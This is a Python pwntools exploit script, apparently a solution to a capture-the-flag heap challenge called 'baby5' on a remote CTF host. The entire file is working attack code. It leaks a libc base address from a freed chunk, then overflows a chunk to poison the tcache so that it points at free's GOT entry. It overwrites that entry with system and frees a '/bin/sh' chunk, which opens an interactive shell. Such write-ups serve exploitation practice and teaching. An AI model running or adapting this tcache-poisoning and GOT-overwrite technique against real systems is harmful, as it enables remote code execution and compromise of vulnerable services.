from pwn import *

#p=process('./baby5')
p=remote('baby-01.pwn.beer',10005)

slog = lambda x,y : success(x+' : '+y)
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
rl = lambda : p.recvline()
rn = lambda x: p.recvn(x)
ru = lambda x : p.recvuntil(x)
go = lambda : p.interactive()

free_got = 0x000000000602018

def add(size,content):
    sa('>','1')
    sla('size:',str(size))
    sa('data:',str(content))

def edit(idx,size,content):
    sa('>','2')
    sla('item',str(idx))
    sla('size:',str(size))
    sa('data:',str(content))

def delete(idx):
    sa('>','3')
    sla('item',str(idx))

def show(idx):
    sa('>','4')
    sla('item',str(idx))

for i in range(9):
    add(0x80,'sdf')

for i in range(8):
    delete(i)

show(7)
ru('data: ')
lb = u64(rl()[:-1]+'\x00'*2) - 0x3ebca0
system = lb + 0x4f440
slog('libcbase',hex(lb))

for i in range(8):
    add(0x80,'sdf')

add(0x40,'sdf')
add(0x40,'sdf')
delete(18)
edit(17,0x90,'A'*0x40+p64(0)+p64(0x51)+p64(free_got))
add(0x40,'/bin/sh')
add(0x40,p64(system))
delete(19)

go()
